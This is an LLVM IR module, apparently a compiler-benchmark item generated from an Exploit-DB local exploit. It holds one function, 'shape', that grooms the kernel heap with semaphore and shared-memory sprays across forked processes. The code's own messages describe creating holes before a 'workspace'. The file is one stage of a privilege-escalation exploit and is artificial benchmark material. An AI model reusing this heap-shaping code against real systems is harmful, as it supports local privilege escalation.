; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_43962.c_shape.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_43962.c_shape.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.flock = type { i32 }

@AF_UNIX = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [26 x i8] c"[*err] socketpair failed\0A\00", align 1
@.str.1 = private unnamed_addr constant [34 x i8] c"[*err*] bytes < 0, are you root?\0A\00", align 1
@.str.2 = private unnamed_addr constant [41 x i8] c"[*] allocate holes before the workspace\0A\00", align 1
@.str.3 = private unnamed_addr constant [62 x i8] c"[*] alloc 0xc pages groups, adjust to continuous allocations\0A\00", align 1
@.str.4 = private unnamed_addr constant [2 x i8] c"p\00", align 1
@.str.5 = private unnamed_addr constant [27 x i8] c"[*] alloc workspace pages\0A\00", align 1
@.str.6 = private unnamed_addr constant [43 x i8] c"[*] finish allocate workspace allocations\0A\00", align 1
@.str.7 = private unnamed_addr constant [54 x i8] c"[*] allocating (0xc - shm | shm) AFTER the workspace\0A\00", align 1
@.str.8 = private unnamed_addr constant [54 x i8] c"[*] free middle allocation, creating workspace freed\0A\00", align 1
@.str.9 = private unnamed_addr constant [73 x i8] c"[*] free prepared holes, create little pages holes before the workspace\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @shape(i64* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i64*, align 8
  %4 = alloca [1024 x i64], align 16
  %5 = alloca [2 x i32], align 4
  %6 = alloca [2 x i32], align 4
  %7 = alloca i8, align 1
  %8 = alloca i64, align 8
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i64, align 8
  %12 = alloca %struct.flock, align 4
  %13 = alloca i64, align 8
  %14 = alloca i64, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  store i64* %0, i64** %3, align 8
  store i64 0, i64* %8, align 8
  store i64 0, i64* %9, align 8
  %23 = call i32 @memset(%struct.flock* %12, i32 0, i32 4)
  %24 = load i32, i32* @AF_UNIX, align 4
  %25 = load i32, i32* @SOCK_STREAM, align 4
  %26 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 0
  %27 = call i32 @socketpair(i32 %24, i32 %25, i32 0, i32* %26)
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %31

29:                                               ; preds = %1
  %30 = call i32 @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str, i64 0, i64 0))
  store i32 1, i32* %2, align 4
  br label %167

31:                                               ; preds = %1
  %32 = call i64 @spray(i64 1)
  store i64 %32, i64* %8, align 8
  %33 = load i64, i64* %8, align 8
  %34 = icmp eq i64 %33, -1
  br i1 %34, label %35, label %37

35:                                               ; preds = %31
  %36 = call i32 @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.1, i64 0, i64 0))
  store i32 1, i32* %2, align 4
  br label %167

37:                                               ; preds = %31
  %38 = load i64, i64* %8, align 8
  %39 = load i64*, i64** %3, align 8
  store i64 %38, i64* %39, align 8
  %40 = load i64*, i64** %3, align 8
  %41 = load i64, i64* %40, align 8
  %42 = call i64 @get_size_factor(i64 %41, i64* %10)
  store i64 %42, i64* %11, align 8
  %43 = load i64, i64* %11, align 8
  %44 = load i64, i64* %8, align 8
  %45 = udiv i64 %44, 1
  %46 = udiv i64 %43, %45
  %47 = add i64 %46, 1
  store i64 %47, i64* %9, align 8
  %48 = call i32 @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.2, i64 0, i64 0))
  store i32 0, i32* %16, align 4
  br label %49

49:                                               ; preds = %57, %37
  %50 = load i32, i32* %16, align 4
  %51 = icmp slt i32 %50, 1024
  br i1 %51, label %52, label %60

52:                                               ; preds = %49
  %53 = call i64 @alloc_sem(i32 28672)
  %54 = load i32, i32* %16, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds [1024 x i64], [1024 x i64]* %4, i64 0, i64 %55
  store i64 %53, i64* %56, align 8
  br label %57

57:                                               ; preds = %52
  %58 = load i32, i32* %16, align 4
  %59 = add nsw i32 %58, 1
  store i32 %59, i32* %16, align 4
  br label %49

60:                                               ; preds = %49
  store i32 0, i32* %17, align 4
  br label %61

61:                                               ; preds = %66, %60
  %62 = load i32, i32* %17, align 4
  %63 = icmp slt i32 %62, 32
  br i1 %63, label %64, label %69

64:                                               ; preds = %61
  %65 = call i64 @alloc_sem(i32 28672)
  br label %66

66:                                               ; preds = %64
  %67 = load i32, i32* %17, align 4
  %68 = add nsw i32 %67, 1
  store i32 %68, i32* %17, align 4
  br label %61

69:                                               ; preds = %61
  store i32 0, i32* %18, align 4
  br label %70

70:                                               ; preds = %75, %69
  %71 = load i32, i32* %18, align 4
  %72 = icmp slt i32 %71, 8192
  br i1 %72, label %73, label %78

73:                                               ; preds = %70
  %74 = call i64 @alloc_sem(i32 4063)
  br label %75

75:                                               ; preds = %73
  %76 = load i32, i32* %18, align 4
  %77 = add nsw i32 %76, 1
  store i32 %77, i32* %18, align 4
  br label %70

78:                                               ; preds = %70
  store i32 0, i32* %19, align 4
  br label %79

79:                                               ; preds = %84, %78
  %80 = load i32, i32* %19, align 4
  %81 = icmp slt i32 %80, 8192
  br i1 %81, label %82, label %87

82:                                               ; preds = %79
  %83 = call i64 @alloc_sem(i32 3)
  br label %84

84:                                               ; preds = %82
  %85 = load i32, i32* %19, align 4
  %86 = add nsw i32 %85, 1
  store i32 %86, i32* %19, align 4
  br label %79

87:                                               ; preds = %79
  %88 = call i64 (...) @fork()
  store i64 %88, i64* %13, align 8
  %89 = load i64, i64* %13, align 8
  %90 = icmp sgt i64 %89, 0
  br i1 %90, label %91, label %100

91:                                               ; preds = %87
  %92 = call i32 @printf(i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.3, i64 0, i64 0))
  %93 = call i64 @spray(i64 5)
  store i64 %93, i64* %8, align 8
  %94 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 1
  %95 = load i32, i32* %94, align 4
  %96 = call i32 @write(i32 %95, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0), i32 1)
  %97 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 1
  %98 = load i32, i32* %97, align 4
  %99 = call i32 @read(i32 %98, i8* %7, i32 1)
  br label %111

100:                                              ; preds = %87
  %101 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 0
  %102 = load i32, i32* %101, align 4
  %103 = call i32 @read(i32 %102, i8* %7, i32 1)
  %104 = call i32 @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.5, i64 0, i64 0))
  %105 = load i64, i64* %9, align 8
  %106 = call i64 @spray(i64 %105)
  store i64 %106, i64* %8, align 8
  %107 = call i32 @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.6, i64 0, i64 0))
  %108 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 0
  %109 = load i32, i32* %108, align 4
  %110 = call i32 @write(i32 %109, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0), i32 1)
  br label %111

111:                                              ; preds = %100, %91
  %112 = load i64, i64* %13, align 8
  %113 = icmp sgt i64 %112, 0
  br i1 %113, label %114, label %141

114:                                              ; preds = %111
  %115 = call i32 @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.7, i64 0, i64 0))
  store i32 0, i32* %20, align 4
  br label %116

116:                                              ; preds = %134, %114
  %117 = load i32, i32* %20, align 4
  %118 = icmp slt i32 %117, 256
  br i1 %118, label %119, label %137

119:                                              ; preds = %116
  %120 = call i64 @alloc_sem(i32 4061)
  store i32 0, i32* %21, align 4
  br label %121

121:                                              ; preds = %130, %119
  %122 = load i32, i32* %21, align 4
  %123 = icmp slt i32 %122, 5
  br i1 %123, label %124, label %133

124:                                              ; preds = %121
  %125 = load i32, i32* %20, align 4
  %126 = mul nsw i32 %125, 256
  %127 = load i32, i32* %21, align 4
  %128 = add nsw i32 %126, %127
  %129 = call i32 @alloc_shm(i32 %128)
  br label %130

130:                                              ; preds = %124
  %131 = load i32, i32* %21, align 4
  %132 = add nsw i32 %131, 1
  store i32 %132, i32* %21, align 4
  br label %121

133:                                              ; preds = %121
  br label %134

134:                                              ; preds = %133
  %135 = load i32, i32* %20, align 4
  %136 = add nsw i32 %135, 1
  store i32 %136, i32* %20, align 4
  br label %116

137:                                              ; preds = %116
  %138 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 1
  %139 = load i32, i32* %138, align 4
  %140 = call i32 @write(i32 %139, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0), i32 1)
  br label %147

141:                                              ; preds = %111
  %142 = getelementptr inbounds [2 x i32], [2 x i32]* %6, i64 0, i64 0
  %143 = load i32, i32* %142, align 4
  %144 = call i32 @read(i32 %143, i8* %7, i32 1)
  %145 = call i32 @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.8, i64 0, i64 0))
  %146 = call i32 @exit(i32 1) #3
  unreachable

147:                                              ; preds = %137
  br label %148

148:                                              ; preds = %151, %147
  %149 = call i64 @wait(i32* %15)
  store i64 %149, i64* %14, align 8
  %150 = icmp sgt i64 %149, 0
  br i1 %150, label %151, label %152

151:                                              ; preds = %148
  br label %148

152:                                              ; preds = %148
  %153 = call i32 @printf(i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.9, i64 0, i64 0))
  store i32 0, i32* %22, align 4
  br label %154

154:                                              ; preds = %163, %152
  %155 = load i32, i32* %22, align 4
  %156 = icmp slt i32 %155, 1024
  br i1 %156, label %157, label %166

157:                                              ; preds = %154
  %158 = load i32, i32* %22, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds [1024 x i64], [1024 x i64]* %4, i64 0, i64 %159
  %161 = load i64, i64* %160, align 8
  %162 = call i32 @free_sem(i64 %161)
  br label %163

163:                                              ; preds = %157
  %164 = load i32, i32* %22, align 4
  %165 = add nsw i32 %164, 1
  store i32 %165, i32* %22, align 4
  br label %154

166:                                              ; preds = %154
  store i32 0, i32* %2, align 4
  br label %167

167:                                              ; preds = %166, %35, %29
  %168 = load i32, i32* %2, align 4
  ret i32 %168
}

declare dso_local i32 @memset(%struct.flock*, i32, i32) #1

declare dso_local i32 @socketpair(i32, i32, i32, i32*) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i64 @spray(i64) #1

declare dso_local i64 @get_size_factor(i64, i64*) #1

declare dso_local i64 @alloc_sem(i32) #1

declare dso_local i64 @fork(...) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i32 @alloc_shm(i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @wait(i32*) #1

declare dso_local i32 @free_sem(i64) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
